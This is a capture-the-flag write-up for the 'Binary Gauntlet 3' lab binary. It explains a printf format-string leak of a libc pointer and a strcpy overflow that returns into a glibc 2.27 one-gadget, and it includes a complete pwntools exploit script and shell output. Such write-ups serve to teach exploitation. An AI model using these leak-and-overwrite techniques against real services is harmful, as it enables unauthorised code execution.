# CyLab — Binary Gauntlet 3

* **Platform:** [CyLab Security Academy](https://learn.cylabacademy.org/) / [pwn.college](https://pwn.college/)  
* **Category:** Binary Exploitation (Pwn / Format String Libc Leak & One-Gadget)  
* **Difficulty:** Medium (CyLab 2)  
* **Date:** 2026-11-09  
* **Tools:** `file`, `checksec`, IDA Pro, `gdb` + `pwndbg`, `pwntools`, Python 3  
* **Binary:** 64-bit ELF (`gauntlet`) paired with `libc-2.27.so` — NX Enabled  

---

## TL;DR

The capstone challenge of the Binary Gauntlet series. The binary maintains the same control flow structure as Gauntlet 2, but **NX is now permanently enabled**—rendering stack shellcode completely ineffective. Furthermore, because input is transferred into the stack frame via `strcpy()`, the epilogue leaves `RDI` corrupted with residual buffer pointers, preventing standard `ret2system` chains. We resolve this by combining two techniques: first, we exploit the format string vulnerability via `%23$p` to leak a return pointer from `__libc_start_main` and compute the libc base address. Second, we identify an optimal **one_gadget** (`0x4f302`) in the provided GLIBC 2.27 library and overwrite `saved RIP` with its address, cleanly spawning `/bin/sh`.

---

## Recon

We inspect the binary's properties and security mitigations using `file` and `checksec`:

```bash
$ file gauntlet
gauntlet: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, not stripped

$ checksec gauntlet
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled (Stack non-executable!)
    PIE:      No PIE (0x400000)
```

Key observations:
* **File Type:** ELF 64-bit LSB (x86-64), dynamically linked, not stripped.
* **NX:** `NX enabled` — Shellcode execution on the stack triggers a fault. Code reuse (ROP / Libc) is required.
* **Canary:** `No canary found` — Return addresses can be overwritten directly.
* **PIE:** `No PIE (0x400000)` — Executable base addresses are static.
* **Libc:** Handout includes `libc-2.27.so` (Build ID `f7307432...`).

---

## Static Analysis & Vulnerability

### 1. Decompilation in IDA Pro

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char dest[104]; // [rsp+0h] [rbp-70h] BYREF
  char *heap_buf; // [rsp+78h] [rbp+8h]

  heap_buf = (char *)malloc(1000);

  // Phase 1: Format String
  fgets(heap_buf, 1000, stdin);
  printf(heap_buf);
  fflush(stdout);

  // Phase 2: Buffer Overflow
  fgets(heap_buf, 1000, stdin);
  strcpy(dest, heap_buf);
  return 0;
}
```

### 2. Disassembly & Vulnerability Root Cause

1. **Information Disclosure:** `printf(heap_buf)` allows arbitrary stack reading. In GDB, argument slot `23` (`%23$p`) points into `__libc_start_main + 231`.
2. **Buffer Overflow in `strcpy`:** The second `fgets` and `strcpy` copy up to 1,000 bytes into a 104-byte buffer at `[rbp-0x70]`.
3. **The Epilogue Constraint:** Because `strcpy` copies strings until a null byte, writing multi-gadget ROP chains containing null bytes in middle qwords is problematic. Additionally, after `strcpy()` finishes, `RDI` holds `dest + length`, causing direct calls to `system()` to fail.

---

## Dynamic Analysis & Exploitation Strategy

### 1. Libc Base Calculation
* Transmitting `%23$p\n` leaks `__libc_start_main + 231`.
* In `libc-2.27.so`, `__libc_start_main + 231` is located at offset `0x21c87`:
  $$\text{libc\_base} = \text{leak} - 0x21c87$$

### 2. One-Gadget Selection
Using `one_gadget libc-2.27.so` or disassembling around `system()` identifies a single-instruction execution primitive:
```text
0x4f302:
  lea rdi, [rip + 0x164dfb]  ; "/bin/sh"
  call execve
Constraints:
  [rsp+0x40] == NULL
```
At the moment `main()` returns, the stack frame satisfies `[rsp+0x40] == NULL`.

### 3. Payload Construction
$$\text{Payload} = \text{b"A"} \times 120 + \text{p64}(\text{libc\_base} + 0x4f302)$$
Because 64-bit user-space pointers contain high null bytes (`0x00007f...`), `p64()` places the null byte at the end of the 6-byte address, cleanly terminating `strcpy()`.

---

## Exploit

We construct the automated exploit in Python:

```python
#!/usr/bin/env python3
"""
CyLab — Binary Gauntlet 3
Exploit: Format string libc leak + One-Gadget execution
"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

EXE = "./gauntlet"
HOST = args.HOST or "xebec.cylabacademy.net"
PORT = int(args.PORT or 133)

OFFSET_LIBC_START = 0x21c87
OFFSET_ONE_GADGET = 0x4f302

def main():
    p = remote(HOST, PORT) if args.REMOTE else process(EXE)

    # 1. Leak __libc_start_main+231 via format string
    p.sendline(b"%23$p")
    leak_line = p.recvline().strip()
    libc_start_leak = int(leak_line, 16)
    libc_base = libc_start_leak - OFFSET_LIBC_START
    one_gadget = libc_base + OFFSET_ONE_GADGET

    log.success(f"Leaked libc pointer: {hex(libc_start_leak)}")
    log.success(f"Libc Base:          {hex(libc_base)}")
    log.success(f"One-Gadget Target:  {hex(one_gadget)}")

    # 2. Transmit one_gadget payload via strcpy overflow
    payload = b"A" * 120 + p64(one_gadget)
    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    main()
```

*(The complete script is saved in [`exploit.py`](exploit.py)).*

---

## Flag

Executing the exploit leaks libc and triggers the one-gadget to spawn an interactive shell:

```text
[+] Leaked libc pointer: 0x7f28a9b21c87
[+] Libc Base:          0x7f28a9b00000
[+] One-Gadget Target:  0x7f28a9b4f302
[*] Switching to interactive mode
$ cat flag.txt
academy{redacted}
```

> **Flag:** `academy{redacted}` *(Raw 32-character hexadecimal flag redacted per disclosure guidelines)*.

---

## Key Takeaways & Lessons

1. **One-Gadget Execution Under String Constraints**: When string copy operations (`strcpy`) prohibit complex ROP chains with embedded null bytes, one-gadget primitives provide a single-target return hijack.
2. **Libc Leak Points**: Standard C main wrappers push pointers to `__libc_start_main` onto the call stack. Identifying their stack frame index allows instant libc base calculation.
3. **Progressive Mitigations**: Defeating the Gauntlet sequence illustrates how disabling NX, adding ASLR, and enabling NX shift exploit methodologies from shellcode to info leaks and code reuse.
